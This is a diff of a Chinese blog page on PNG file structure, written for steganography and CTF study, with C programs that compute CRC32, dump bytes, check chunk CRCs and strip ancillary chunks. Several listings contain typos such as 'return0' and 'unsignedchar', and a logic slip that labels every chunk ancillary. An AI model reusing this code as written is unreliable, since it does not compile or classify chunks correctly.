@@ -44,8 +44,8 @@
     <h2 class="author">Peter pan</h2>
     <h3 class="description">the mark of an educated mind is to be able to entertain a thought without accepting it</h3>
     <div class="count-box">
-      <a href="/archives"><div><strong>97</strong><br>文章</div></a>
-      <a href="/categories"><div><strong>89</strong><br>分类</div></a>
+      <a href="/archives"><div><strong>98</strong><br>文章</div></a>
+      <a href="/categories"><div><strong>90</strong><br>分类</div></a>
       <a href="/tags"><div><strong>14</strong><br>标签</div></a>
     </div>
     <ul class="blog-link">
@@ -111,10 +111,8 @@
       
         <p>让我们一起来了解一下png图片的构成吧～知其然亦知其所以然</p>
 <a id="more"></a>
-<h2 id="00x0-前言"><a class="markdownIt-Anchor" href="#00x0-前言"></a> 00X0-前言</h2>
-<p>其实是在研究隐写术的时候遇到了瓶颈，所以决定去系统的了解一下png的文件格式做一个总结，到这个阶段的隐写术不可能是单纯的三板斧解决的问题，以前为了做题总是将工具当作了主导，其实这样是不对的。工具只能起一部分的分析作用，自身的知识储备才是最重要的部分，否则始终都只是一个<code>script kid</code>。在这里向道哥致敬～</p>
-<h2 id="0x01-png文件格式"><a class="markdownIt-Anchor" href="#0x01-png文件格式"></a> 0X01-PNG文件格式</h2>
-<p><strong>1、PNG文件署名域</strong></p>
+<h2 id="00X0-前言"><a href="#00X0-前言" class="headerlink" title="00X0-前言"></a>00X0-前言</h2><p>其实是在研究隐写术的时候遇到了瓶颈，所以决定去系统的了解一下png的文件格式做一个总结，到这个阶段的隐写术不可能是单纯的三板斧解决的问题，以前为了做题总是将工具当作了主导，其实这样是不对的。工具只能起一部分的分析作用，自身的知识储备才是最重要的部分，否则始终都只是一个<code>script kid</code>。在这里向道哥致敬～</p>
+<h2 id="0X01-PNG文件格式"><a href="#0X01-PNG文件格式" class="headerlink" title="0X01-PNG文件格式"></a>0X01-PNG文件格式</h2><p><strong>1、PNG文件署名域</strong></p>
 <p>前8字节</p>
 <p>固定格式，16进制为： 89 504e 47 0d 0a 1a 0a</p>
 <p><strong>2、数据块</strong></p>
@@ -140,14 +138,13 @@
 <p>(8) 图像最后修改时间数据块tIME(image last-modification time)</p>
 <p>(9) 图像透明数据块tRNS(transparency)</p>
 <p>(10) 压缩文本数据块zTXt(compressed textual data)</p>
-<h2 id="0x02-实例图片分析"><a class="markdownIt-Anchor" href="#0x02-实例图片分析"></a> 0x02-实例图片分析</h2>
-<p><img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-29%20%E4%B8%8B%E5%8D%882.36.18.png" alt=""></p>
+<h2 id="0x02-实例图片分析"><a href="#0x02-实例图片分析" class="headerlink" title="0x02-实例图片分析"></a>0x02-实例图片分析</h2><p><img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-29%20%E4%B8%8B%E5%8D%882.36.18.png" alt=""></p>
 <p><img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-29%20%E4%B8%8B%E5%8D%882.37.29.png" alt=""></p>
 <ol>
 <li>png文件署名域</li>
 </ol>
-<pre class="highlight"><code class="c"><span class="hljs-comment">//固定格式</span>
-<span class="hljs-number">89</span> <span class="hljs-number">50</span> <span class="hljs-number">4</span>e <span class="hljs-number">47</span> <span class="hljs-number">0</span>d <span class="hljs-number">0</span>a <span class="hljs-number">1</span>a <span class="hljs-number">0</span>a
+<pre><code class="c">//固定格式
+89 50 4e 47 0d 0a 1a 0a
 </code></pre>
 <p>据块结构：</p>
 <p>Length: 00 00 00 0D</p>
@@ -159,44 +156,42 @@
 <p>CRC： 4字节，对Chunk Type Code+Chunk Data作CRC32计算得出的值</p>
 <p>即对以下十六进制作计算： 49 48 44 52 00 00 03 20 00 00 02 90 08 02 00 00 00</p>
 <p>我们可以编写程序对CRC算法进行一次验证；</p>
-<pre class="highlight"><code class="c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>
-<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span>
-<span class="hljs-function"><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> <span class="hljs-title">GetCrc32</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* InStr,<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> len)</span></span>{        
- <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>  Crc32Table[<span class="hljs-number">256</span>];     
- <span class="hljs-keyword">int</span> i,j;        
- <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> Crc;        
- <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">256</span>; i++){        
+<pre><code class="c">#include&lt;stdio.h&gt;
+#include &lt;string.h&gt;
+unsigned int GetCrc32(char* InStr,unsigned int len){        
+ unsigned int  Crc32Table[256];     
+ int i,j;        
+ unsigned int Crc;        
+ for(i = 0; i &lt; 256; i++){        
             Crc= i;        
-            <span class="hljs-keyword">for</span>(j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">8</span>; j++){        
-              <span class="hljs-keyword">if</span> (Crc &amp; <span class="hljs-number">1</span>)        
-                        Crc= (Crc &gt;&gt; <span class="hljs-number">1</span>) ^ <span class="hljs-number">0xEDB88320</span>;        
-              <span class="hljs-keyword">else</span>      
-                        Crc&gt;&gt;= <span class="hljs-number">1</span>;      
+            for(j = 0; j &lt; 8; j++){        
+              if (Crc &amp; 1)        
+                        Crc= (Crc &gt;&gt; 1) ^ 0xEDB88320;        
+              else      
+                        Crc&gt;&gt;= 1;      
             }        
             Crc32Table[i]= Crc;        
  }        
- Crc=<span class="hljs-number">0xffffffff</span>;        
- <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> m=<span class="hljs-number">0</span>; m&lt;len; m++){          
-            Crc= (Crc &gt;&gt; <span class="hljs-number">8</span>) ^ Crc32Table[(Crc &amp; <span class="hljs-number">0xFF</span>) ^ InStr[m]];        
- 	}     
- 	Crc^= <span class="hljs-number">0xFFFFFFFF</span>;     
- 	<span class="hljs-keyword">return</span> Crc;        
+ Crc=0xffffffff;        
+ for(int m=0; m&lt;len; m++){          
+            Crc= (Crc &gt;&gt; 8) ^ Crc32Table[(Crc &amp; 0xFF) ^ InStr[m]];        
+     }     
+     Crc^= 0xFFFFFFFF;     
+     return Crc;        
 }       
-<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span>
-</span>{
-            <span class="hljs-keyword">char</span> buf[<span class="hljs-number">17</span>]={<span class="hljs-number">0x49</span>,<span class="hljs-number">0x48</span>,<span class="hljs-number">0x44</span>,<span class="hljs-number">0x52</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x1A</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x1A</span>,<span class="hljs-number">0x08</span>,<span class="hljs-number">0x04</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>};
-            <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> crc32=GetCrc32(buf,<span class="hljs-keyword">sizeof</span>(buf));
-            <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%08X\n"</span>,crc32);
-            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+int main(int argc, char* argv[])
+{
+            char buf[17]={0x49,0x48,0x44,0x52,0x00,0x00,0x00,0x1A,0x00,0x00,0x00,0x1A,0x08,0x04,0x00,0x00,0x00};
+            unsigned int crc32=GetCrc32(buf,sizeof(buf));
+            printf(&quot;%08X\n&quot;,crc32);
+            return 0;
 }
 </code></pre>
 <p>运行程序之后发现算出来的CRC校验准确无误，那么从这里我们就可以想到就算是在，Unix/linux系统上修改了图片的宽高之后与CRC校验不符，也可以通过这种方a式来修改CRC校验，hhh，那么就不需要该死的windows了。</p>
 <p><strong>(2) gAMA</strong></p>
 <blockquote>
-<p>00000021h: 00 00 00 04 67 41 4D 41 00 00 B18F 0B FC 61 05</p>
-</blockquote>
-<blockquote>
-<p>….gAMA…睆.黙.</p>
+<p>00000021h: 00 00 00 04 67 41 4D 41 00 00 B18F 0B FC 61 05 </p>
+<p>….gAMA..睆.黙.</p>
 </blockquote>
 <p>数据块结构：</p>
 <p>Length: 00 00 00 04</p>
@@ -205,10 +200,8 @@
 <p>CRC： 0B FC 61 05</p>
 <p><strong>(3) cHRM</strong></p>
 <blockquote>
-<p>00000031h: 00 00 00 20 63 48 52 4D 00 00 7A26 00 00 80 84 ; … cHRM…z&amp;…€? 00000041h: 00 00 FA 00 00 00 80 E8 00 00 7530 00 00 EA 60</p>
-</blockquote>
-<blockquote>
-<p>…?..€?.u0…阘 00000051h: 00 00 3A 9800 00 17 70 9C BA 51 3C ; …:?..p満Q&lt;</p>
+<p>00000031h: 00 00 00 20 63 48 52 4D 00 00 7A26 00 00 80 84 ; … cHRM..z&amp;..€? 00000041h: 00 00 FA 00 00 00 80 E8 00 00 7530 00 00 EA 60 </p>
+<p>..?..€?.u0..阘 00000051h: 00 00 3A 9800 00 17 70 9C BA 51 3C ; ..:?..p満Q&lt;</p>
 </blockquote>
 <p>数据块结构：</p>
 <p>Length: 00 00 00 20</p>
@@ -224,125 +217,124 @@
 <p>Chunk Data：</p>
 <p>CRC： AE 42 60 82</p>
 <p>固定结构，CRC的值为对ChunkType Code作CRC32校验</p>
-<h2 id="0x03-编写程序分析文件格式"><a class="markdownIt-Anchor" href="#0x03-编写程序分析文件格式"></a> 0x03-编写程序分析文件格式</h2>
-<p>开发工具：vc6.0、dev-c++、codeblocks</p>
+<h2 id="0x03-编写程序分析文件格式"><a href="#0x03-编写程序分析文件格式" class="headerlink" title="0x03-编写程序分析文件格式"></a>0x03-编写程序分析文件格式</h2><p>开发工具：vc6.0、dev-c++、codeblocks</p>
 <ol>
 <li>读取PNG文件</li>
 </ol>
 <p>保存为example2.cpp，代码如下:</p>
-<pre class="highlight"><code class="c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>
-<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;string.h&gt;</span></span>
-<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span>
-</span>{
+<pre><code class="c">#include&lt;stdio.h&gt;
+#include&lt;string.h&gt;
+int main(int argc, char* argv[])
+{
             FILE *fp;   
-            <span class="hljs-keyword">if</span>((fp=fopen(<span class="hljs-string">"c:\\test\\test.png"</span>,<span class="hljs-string">"rb+"</span>))==<span class="hljs-literal">NULL</span>)
+            if((fp=fopen(&quot;c:\\test\\test.png&quot;,&quot;rb+&quot;))==NULL)
                         return0;   
-            fseek(fp,<span class="hljs-number">0</span>,SEEK_END);
-            <span class="hljs-keyword">int</span> len=ftell(fp);
-            unsignedchar *buf=<span class="hljs-keyword">new</span> <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>[len];      
-            fseek(fp,<span class="hljs-number">0</span>,SEEK_SET);
-            fread(buf,len,<span class="hljs-number">1</span>,fp);
-            <span class="hljs-built_in">printf</span>(<span class="hljs-string">"len=%d\n"</span>,len);
-            <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">1</span>;i&lt;=len;i++)
+            fseek(fp,0,SEEK_END);
+            int len=ftell(fp);
+            unsignedchar *buf=new unsigned char[len];      
+            fseek(fp,0,SEEK_SET);
+            fread(buf,len,1,fp);
+            printf(&quot;len=%d\n&quot;,len);
+            for(int i=1;i&lt;=len;i++)
             {
-                        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%02X"</span>,buf[i<span class="hljs-number">-1</span>]);
-                        <span class="hljs-keyword">if</span>(i%<span class="hljs-number">16</span>==<span class="hljs-number">0</span>)
-                                    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"\n"</span>);
+                        printf(&quot;%02X&quot;,buf[i-1]);
+                        if(i%16==0)
+                                    printf(&quot;\n&quot;);
             }
             fclose(fp);
-            <span class="hljs-built_in">printf</span>(<span class="hljs-string">"\n"</span>);
+            printf(&quot;\n&quot;);
             return0;         
 }
 </code></pre>
 <p>如图，程序按照UltraEdit的格式输出，以便后续的格式分析:</p>
 <p><img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-29%20%E4%B8%8B%E5%8D%882.56.48.png" alt=""></p>
-<ol start="2">
+<ol>
 <li>解析数据块结构</li>
 </ol>
 <p>从第8字节开始，读前四字节为ChunkLength</p>
 <p>对应的代码为：</p>
-<pre class="highlight"><code class="C"><span class="hljs-keyword">unsigned</span> intChunkLen=(buf[<span class="hljs-number">0</span>]&lt;&lt;<span class="hljs-number">24</span>)|(buf[<span class="hljs-number">1</span>]&lt;&lt;<span class="hljs-number">16</span>)|(buf[<span class="hljs-number">2</span>]&lt;&lt;<span class="hljs-number">8</span>)|buf[<span class="hljs-number">3</span>];
+<pre><code class="C">unsigned intChunkLen=(buf[0]&lt;&lt;24)|(buf[1]&lt;&lt;16)|(buf[2]&lt;&lt;8)|buf[3];
 </code></pre>
 <p>接着四字节为ChunkName</p>
-<pre class="highlight"><code class="C"><span class="hljs-built_in">printf</span>(<span class="hljs-string">"ChunkName:%c%c%c%c\n"</span>,buf[<span class="hljs-number">0</span>],buf[<span class="hljs-number">1</span>],buf[<span class="hljs-number">2</span>],buf[<span class="hljs-number">3</span>]);
+<pre><code class="C">printf(&quot;ChunkName:%c%c%c%c\n&quot;,buf[0],buf[1],buf[2],buf[3]);
 </code></pre>
 <p>然后根据ChunkLength读出完整的ChunkData</p>
 <p>最后读出CRC32的值,同Chunk Type Code+Chunk Data求出的CRC32校验值作比较</p>
 <p>保存为check.cpp,完整代码如下：</p>
-<pre class="highlight"><code class="C"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>
-<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;string.h&gt;</span></span>
-<span class="hljs-function"><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> <span class="hljs-title">GetCrc32</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>*InStr,<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> len)</span></span>{        
-            <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> Crc32Table[<span class="hljs-number">256</span>];      
-            <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> i,j;        
-            <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> Crc;        
-            <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">256</span>; i++){        
+<pre><code class="C">#include&lt;stdio.h&gt;
+#include&lt;string.h&gt;
+unsigned int GetCrc32(unsigned char*InStr,unsigned int len){        
+            unsigned int Crc32Table[256];      
+            unsigned int i,j;        
+            unsigned int Crc;        
+            for(i = 0; i &lt; 256; i++){        
                         Crc= i;        
-                        <span class="hljs-keyword">for</span>(j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">8</span>; j++){        
-                                    <span class="hljs-keyword">if</span>(Crc &amp; <span class="hljs-number">1</span>)        
-                                                Crc= (Crc &gt;&gt; <span class="hljs-number">1</span>) ^ <span class="hljs-number">0xEDB88320</span>;        
-                                    <span class="hljs-keyword">else</span>       
-                                                Crc&gt;&gt;= <span class="hljs-number">1</span>;      
+                        for(j = 0; j &lt; 8; j++){        
+                                    if(Crc &amp; 1)        
+                                                Crc= (Crc &gt;&gt; 1) ^ 0xEDB88320;        
+                                    else       
+                                                Crc&gt;&gt;= 1;      
                         }        
                         Crc32Table[i]= Crc;        
             }        
-            Crc=<span class="hljs-number">0xffffffff</span>;        
-            <span class="hljs-keyword">for</span>(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> m=<span class="hljs-number">0</span>; m&lt;len; m++){          
-                        Crc= (Crc &gt;&gt; <span class="hljs-number">8</span>) ^ Crc32Table[(Crc &amp; <span class="hljs-number">0xFF</span>) ^ InStr[m]];        
+            Crc=0xffffffff;        
+            for(unsigned int m=0; m&lt;len; m++){          
+                        Crc= (Crc &gt;&gt; 8) ^ Crc32Table[(Crc &amp; 0xFF) ^ InStr[m]];        
             }     
-            Crc ^= <span class="hljs-number">0xFFFFFFFF</span>;     
+            Crc ^= 0xFFFFFFFF;     
             returnCrc;        
 }       
-<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span>
-</span>{
+int main(int argc, char* argv[])
+{
             FILE*fp;   
-            <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> *buf=<span class="hljs-literal">NULL</span>;
-            <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> len=<span class="hljs-number">0</span>;
-            <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> ChunkLen=<span class="hljs-number">0</span>;
-            <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> ChunkCRC32=<span class="hljs-number">0</span>;
-            <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> ChunkOffset=<span class="hljs-number">0</span>;         
-            <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> crc32=<span class="hljs-number">0</span>;
-            <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;
-            <span class="hljs-keyword">if</span>((fp=fopen(<span class="hljs-string">"c:\\test\\test.png"</span>,<span class="hljs-string">"rb+"</span>))==<span class="hljs-literal">NULL</span>)
+            unsigned char *buf=NULL;
+            unsigned int len=0;
+            unsigned int ChunkLen=0;
+            unsigned int ChunkCRC32=0;
+            unsigned int ChunkOffset=0;         
+            unsigned int crc32=0;
+            unsigned int i=0;
+            if((fp=fopen(&quot;c:\\test\\test.png&quot;,&quot;rb+&quot;))==NULL)
                         return0;   
-            fseek(fp,<span class="hljs-number">0</span>,SEEK_END);
+            fseek(fp,0,SEEK_END);
             len=ftell(fp);
-            buf=newunsigned <span class="hljs-keyword">char</span>[len];
-            fseek(fp,<span class="hljs-number">0</span>,SEEK_SET);
-            fread(buf,len,<span class="hljs-number">1</span>,fp);
-            <span class="hljs-built_in">printf</span>(<span class="hljs-string">"TotalLen=%d\n"</span>,len);
-            <span class="hljs-built_in">printf</span>(<span class="hljs-string">"----------------------------------------------------\n"</span>);
-            fseek(fp,<span class="hljs-number">8</span>,SEEK_SET);
-            ChunkOffset=<span class="hljs-number">8</span>;
-            i=<span class="hljs-number">0</span>;
-            <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)
+            buf=newunsigned char[len];
+            fseek(fp,0,SEEK_SET);
+            fread(buf,len,1,fp);
+            printf(&quot;TotalLen=%d\n&quot;,len);
+            printf(&quot;----------------------------------------------------\n&quot;);
+            fseek(fp,8,SEEK_SET);
+            ChunkOffset=8;
+            i=0;
+            while(1)
             {
                         i++;
-                        <span class="hljs-built_in">memset</span>(buf,<span class="hljs-number">0</span>,len);
-                        fread(buf,<span class="hljs-number">4</span>,<span class="hljs-number">1</span>,fp);
-                        ChunkLen=(buf[<span class="hljs-number">0</span>]&lt;&lt;<span class="hljs-number">24</span>)|(buf[<span class="hljs-number">1</span>]&lt;&lt;<span class="hljs-number">16</span>)|(buf[<span class="hljs-number">2</span>]&lt;&lt;<span class="hljs-number">8</span>)|buf[<span class="hljs-number">3</span>];
-                        fread(buf,<span class="hljs-number">4</span>+ChunkLen,<span class="hljs-number">1</span>,fp);
-                        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"[+]ChunkName:%c%c%c%c                 "</span>,buf[<span class="hljs-number">0</span>],buf[<span class="hljs-number">1</span>],buf[<span class="hljs-number">2</span>],buf[<span class="hljs-number">3</span>]);
-                        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strncmp</span>((<span class="hljs-keyword">char</span>*)buf,<span class="hljs-string">"IHDR"</span>,<span class="hljs-number">4</span>)==<span class="hljs-number">0</span>|<span class="hljs-built_in">strncmp</span>((<span class="hljs-keyword">char</span>*)buf,<span class="hljs-string">"PLTE"</span>,<span class="hljs-number">4</span>)==<span class="hljs-number">0</span>|<span class="hljs-built_in">strncmp</span>((<span class="hljs-keyword">char</span> *)buf,<span class="hljs-string">"IDAT"</span>,<span class="hljs-number">4</span>)==<span class="hljs-number">0</span>)
-                                    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"PaletteChunk\n"</span>);
-                        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"AncillaryChunk\n"</span>);
-                        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"   ChunkOffset:0x%08x       \n"</span>,ChunkOffset);
-                        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"   ChunkLen: %10d              \n"</span>,ChunkLen);
-                        ChunkOffset+=ChunkLen+<span class="hljs-number">12</span>;
-                        crc32=GetCrc32(buf,ChunkLen+<span class="hljs-number">4</span>);
-                        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"   ExpectCRC32:%08X\n"</span>,crc32);
-                        fread(buf,<span class="hljs-number">4</span>,<span class="hljs-number">1</span>,fp);
-                        ChunkCRC32=(buf[<span class="hljs-number">0</span>]&lt;&lt;<span class="hljs-number">24</span>)|(buf[<span class="hljs-number">1</span>]&lt;&lt;<span class="hljs-number">16</span>)|(buf[<span class="hljs-number">2</span>]&lt;&lt;<span class="hljs-number">8</span>)|buf[<span class="hljs-number">3</span>];
-                        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"   ChunkCRC32: %08X                     "</span>,ChunkCRC32);
-                        <span class="hljs-keyword">if</span>(crc32!=ChunkCRC32)
-                                    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"[!]CRC32CheckError!\n"</span>);
-                        <span class="hljs-keyword">else</span>
-                                    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"CheckSuccess!\n\n"</span>);
+                        memset(buf,0,len);
+                        fread(buf,4,1,fp);
+                        ChunkLen=(buf[0]&lt;&lt;24)|(buf[1]&lt;&lt;16)|(buf[2]&lt;&lt;8)|buf[3];
+                        fread(buf,4+ChunkLen,1,fp);
+                        printf(&quot;[+]ChunkName:%c%c%c%c                 &quot;,buf[0],buf[1],buf[2],buf[3]);
+                        if(strncmp((char*)buf,&quot;IHDR&quot;,4)==0|strncmp((char*)buf,&quot;PLTE&quot;,4)==0|strncmp((char *)buf,&quot;IDAT&quot;,4)==0)
+                                    printf(&quot;PaletteChunk\n&quot;);
+                        printf(&quot;AncillaryChunk\n&quot;);
+                        printf(&quot;   ChunkOffset:0x%08x       \n&quot;,ChunkOffset);
+                        printf(&quot;   ChunkLen: %10d              \n&quot;,ChunkLen);
+                        ChunkOffset+=ChunkLen+12;
+                        crc32=GetCrc32(buf,ChunkLen+4);
+                        printf(&quot;   ExpectCRC32:%08X\n&quot;,crc32);
+                        fread(buf,4,1,fp);
+                        ChunkCRC32=(buf[0]&lt;&lt;24)|(buf[1]&lt;&lt;16)|(buf[2]&lt;&lt;8)|buf[3];
+                        printf(&quot;   ChunkCRC32: %08X                     &quot;,ChunkCRC32);
+                        if(crc32!=ChunkCRC32)
+                                    printf(&quot;[!]CRC32CheckError!\n&quot;);
+                        else
+                                    printf(&quot;CheckSuccess!\n\n&quot;);
                         ChunkLen=ftell(fp);
-                        <span class="hljs-keyword">if</span>(ChunkLen==(len<span class="hljs-number">-12</span>))
+                        if(ChunkLen==(len-12))
                         {
-                                    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"\n----------------------------------------------------\n"</span>);
-                                    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"TotalChunk:%d\n"</span>,i);                        
-                                    <span class="hljs-keyword">break</span>;
+                                    printf(&quot;\n----------------------------------------------------\n&quot;);
+                                    printf(&quot;TotalChunk:%d\n&quot;,i);                        
+                                    break;
                         }
             }
             fclose(fp);
@@ -352,120 +344,118 @@
 <p>运行如图，可获得完整的PNG文件结构:</p>
 <p><img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-29%20%E4%B8%8B%E5%8D%882.58.01.png" alt=""></p>
 <p>注：这个程序可用来对PNG文件进行格式分析，标记PNG文件的数据块名称、偏移地址、数据块长度、比较预期和实际的CRC32校验码，可基于此对批量文件进行分析，查找可疑文件。</p>
-<h2 id="0x04-去除多余数据"><a class="markdownIt-Anchor" href="#0x04-去除多余数据"></a> 0x04-去除多余数据</h2>
-<p>上面提到，去除辅助数据块的内容对PNG图像的浏览没有影响，下面就尝试去除PNG文件的所有辅助数据块</p>
+<h2 id="0x04-去除多余数据"><a href="#0x04-去除多余数据" class="headerlink" title="0x04-去除多余数据"></a>0x04-去除多余数据</h2><p>上面提到，去除辅助数据块的内容对PNG图像的浏览没有影响，下面就尝试去除PNG文件的所有辅助数据块</p>
 <ol>
 <li>工具实现</li>
 </ol>
 <p>使用Hex Editor去除辅助数据块gAMA、cHRM和bKGD</p>
 <p>文件大小变化，但不影响PNG文件浏览</p>
-<ol start="2">
+<ol>
 <li>程序实现</li>
 </ol>
 <p>去除所有辅助数据块，只提取关键信息。程序先对ChunkName作判断，忽略非关键数据块(Ancillary Chunk)的内容，并保存为new.png</p>
 <p>保存为compress.cpp,完整代码为：</p>
-<pre class="highlight"><code class="C"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>
-<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;string.h&gt;</span></span>
-<span class="hljs-function"><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> <span class="hljs-title">GetCrc32</span><span class="hljs-params">(unsignedchar*InStr,<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> len)</span></span>{        
-           <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> Crc32Table[<span class="hljs-number">256</span>];      
-           <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> i,j;        
-           <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> Crc;        
-           <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">256</span>; i++){        
+<pre><code class="C">#include&lt;stdio.h&gt;
+#include&lt;string.h&gt;
+unsigned int GetCrc32(unsignedchar*InStr,unsigned int len){        
+           unsigned int Crc32Table[256];      
+           unsigned int i,j;        
+           unsigned int Crc;        
+           for(i = 0; i &lt; 256; i++){        
                        Crc= i;        
-                       <span class="hljs-keyword">for</span> (j = <span class="hljs-number">0</span>;j &lt; <span class="hljs-number">8</span>; j++){        
-                                   <span class="hljs-keyword">if</span>(Crc &amp; <span class="hljs-number">1</span>)        
-                                               Crc= (Crc &gt;&gt; <span class="hljs-number">1</span>) ^ <span class="hljs-number">0xEDB88320</span>;        
-                                   <span class="hljs-keyword">else</span>       
-                                               Crc&gt;&gt;= <span class="hljs-number">1</span>;      
+                       for (j = 0;j &lt; 8; j++){        
+                                   if(Crc &amp; 1)        
+                                               Crc= (Crc &gt;&gt; 1) ^ 0xEDB88320;        
+                                   else       
+                                               Crc&gt;&gt;= 1;      
                        }        
                        Crc32Table[i]= Crc;        
            }        
-           Crc=<span class="hljs-number">0xffffffff</span>;        
-           <span class="hljs-keyword">for</span>(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> m=<span class="hljs-number">0</span>; m&lt;len; m++){         
-                       Crc= (Crc &gt;&gt; <span class="hljs-number">8</span>) ^ Crc32Table[(Crc &amp; <span class="hljs-number">0xFF</span>) ^InStr[m]];        
+           Crc=0xffffffff;        
+           for(unsigned int m=0; m&lt;len; m++){         
+                       Crc= (Crc &gt;&gt; 8) ^ Crc32Table[(Crc &amp; 0xFF) ^InStr[m]];        
            }     
-           Crc^= <span class="hljs-number">0xFFFFFFFF</span>;     
-           <span class="hljs-keyword">return</span> Crc;        
+           Crc^= 0xFFFFFFFF;     
+           return Crc;        
 }       
-<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span>
-</span>{
+int main(int argc, char* argv[])
+{
            FILE *fp,*fpnew;   
-           <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> *buf=<span class="hljs-literal">NULL</span>;
-           <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> len=<span class="hljs-number">0</span>;
-           <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> ChunkLen=<span class="hljs-number">0</span>;
-           <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> ChunkCRC32=<span class="hljs-number">0</span>;
-           <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> ChunkOffset=<span class="hljs-number">0</span>;         
-           <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> crc32=<span class="hljs-number">0</span>;
